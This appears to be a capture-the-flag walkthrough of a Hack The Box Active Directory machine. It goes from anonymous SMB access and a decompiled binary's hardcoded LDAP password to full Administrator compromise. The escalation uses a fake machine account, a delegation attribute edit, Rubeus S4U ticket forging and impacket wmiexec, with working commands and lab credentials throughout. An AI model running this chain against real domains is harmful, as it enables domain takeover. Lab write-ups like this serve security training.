# Nmap findings
```table
ORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

```

After enumeration, found smb has no logon:
`smbclient -L 10.10.11.174`

```text

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

Downloaded file from smb share called `support-tools`

`UserInfo.exe.zip`
After extracting we need Windows in order to peek into the binary

```C#
internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}

// path, username, password
this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

We might have an LDAP username + pw

Username: `support\\ldap`
Decoded password:  `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

```bash
ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' 
```

This leads us to the following password:
```
user: support
pass: Ironside47pleasure40Watchful
```

To connect and get user flag:
```bash
evil-winrm -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful
```

Privesc: (we need the following)
```
-a----         9/20/2022   3:52 AM         135586 Powermad.ps1
-a----         9/20/2022   3:53 AM         770279 PowerView.ps1
-a----         9/20/2022   3:53 AM         441344 Rubeus.exe
```

import two modues by:
```powershell
import-module .\Powermad.ps1
import-module .\PowerView.ps1
```

Create fake computer in Domain:
```powershell
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

Get-DomainComputer fake01
```

Returns object-id: `S-1-5-21-1677581083-3380853377-188903654-5103`

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5103)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)


Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

```powershell
.\Rubeus.exe hash /password:123456 /user:fake01 /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : fake01
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBfake01
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 3E1A2E5F7675F6BA5C21FDEABFD92B93
[*]       aes256_cts_hmac_sha1 : 37CD1332C1F8DC0C4AA0B738CC971DEBD8D66AED50AF2AF2EC63B7459344B834
[*]       des_cbc_md5          : E0795B98AEA1A16B


.\Rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /ptt
```

We get a b64 ticket for the user `Administrator` 😎

```bash
impacket-getST support.htb/fake01:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb
export KRB5CCNAME=administrator.ccache
impacket-wmiexec support.htb/Administrator@dc.support.htb -no-pass -k
```

